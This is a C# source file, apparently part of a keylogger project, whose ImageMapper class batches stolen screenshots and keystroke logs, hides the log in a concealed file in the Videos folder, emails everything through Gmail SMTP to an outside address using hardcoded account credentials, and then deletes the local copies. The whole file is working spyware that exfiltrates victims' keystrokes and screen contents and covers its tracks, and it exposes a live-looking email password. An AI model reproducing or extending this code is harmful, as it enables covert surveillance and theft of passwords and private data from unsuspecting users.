using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.Text;
using System.Threading.Tasks;

namespace MyKeylogger
{
    public class ImageMapper
    {
        //using Worker to send mail
        BackgroundWorker bw = new BackgroundWorker();

        //List to save the info of the screenshots taken
        private static List<ImageMap> imageMapList = new List<ImageMap>();
        //Copy of the image list, used to send via mail
        private static List<ImageMap> sendingImageMapList = new List<ImageMap>();
        //Flag to determine if the mail was completed sent
        private bool mailsent = true;
        //string to save keylog content
        public string klog;

        public ImageMapper()
        {
            //Background worker definitions
            bw.WorkerSupportsCancellation = false;
            bw.WorkerReportsProgress = false;
            bw.DoWork += new DoWorkEventHandler(bw_DoWork);
            bw.RunWorkerCompleted += new RunWorkerCompletedEventHandler(bw_RunWorkerCompleted);
        }

        //Clear the keylog string
        public void clearKeylog()
        {
            klog = "";
        }

        //Getting ready to send content via mail
        public void Worker()
        {
            //Clear the old content of the images list to send via mail
            sendingImageMapList.Clear();

            //Copy the image List
            imageMapList.ForEach((item) =>
            {
                sendingImageMapList.Add(new ImageMap(item._fileName, item._filePath, item._bitmap));
            });

            //Create a new keylog file to sent via mail
            if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini")) return;
            else
            {
                File.Create(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini").Dispose();
                File.SetAttributes(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini", FileAttributes.Hidden);
            }
            //Save keylog text in a new file
            File.AppendAllText(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini", klog);
            //clear keylog variable
            clearKeylog();

            //Delete keylog original file
            Functions.DeleteFile();
            
        }

        //Add screenshot image taken to list
        public void AddImageToList(string fileName, string filePath, Bitmap bitmap)
        {
            //If the list has 5 itens, sent the itens by mail and clear the list
            if ( (imageMapList.Count > 5) && mailsent)
            {
                //flag to avoid sensing multiple mails at the same time
                mailsent = false;

                //call worker method
                Worker();
                //start background worker
                bw.RunWorkerAsync();

                //clear the image list
                imageMapList.Clear();
            }

            //add the new ss to list
            imageMapList.Add(new ImageMap(fileName,filePath, bitmap));
        }

       
        private void bw_DoWork(object sender, DoWorkEventArgs e)
        {
            //Attach Images
            string html = @"<html><body><img src=""cid:YourPictureId""></body></html>";
            AlternateView altView = AlternateView.CreateAlternateViewFromString(html, null, MediaTypeNames.Text.Html);

            //Add each image of the list to mail
            foreach (ImageMap img in sendingImageMapList)
            {
                LinkedResource yourPictureRes = new LinkedResource(img._filePath, MediaTypeNames.Image.Jpeg);
                yourPictureRes.ContentId = img._fileName;
                altView.LinkedResources.Add(yourPictureRes);
            }

            //Attach Keylogger
            string kPath = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini";
            LinkedResource _keyloggerFile = new LinkedResource(kPath, MediaTypeNames.Text.Plain);
            _keyloggerFile.ContentId = "keylogger-file";
            altView.LinkedResources.Add(_keyloggerFile);

            //Send Mail
            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            client.Credentials = new NetworkCredential("team.net.sou@gmail.com", "n2tw9rk@s9u!c9m");
            using (MailMessage msg = new MailMessage())
            {
                // setup message details here
                msg.To.Add(new MailAddress("team.net.sou@gmail.com"));
                msg.From = new MailAddress("team.net.sou@gmail.com");
                msg.Subject = "Client: " + Environment.MachineName + " Has Sent You A Screenshot";
                msg.AlternateViews.Add(altView);
                client.EnableSsl = true;
                client.Send(msg);
            }

        }

        /// <summary>
        /// Runs when background worker completed its work
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void bw_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
        {
            //delete images
            foreach (ImageMap img in sendingImageMapList)
            {
                FileInfo file = new FileInfo(img._filePath);
                if (file.Exists)
                {
                    file.Delete();
                }
            }

            //delete copy of keylog
            FileInfo keyfile = new FileInfo(Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\ks\\sendMyKeylogger.ini");
            if (keyfile.Exists)
            {
                keyfile.Delete();
            }

            //allows to send other mail
            mailsent = true;

        }

    }
}
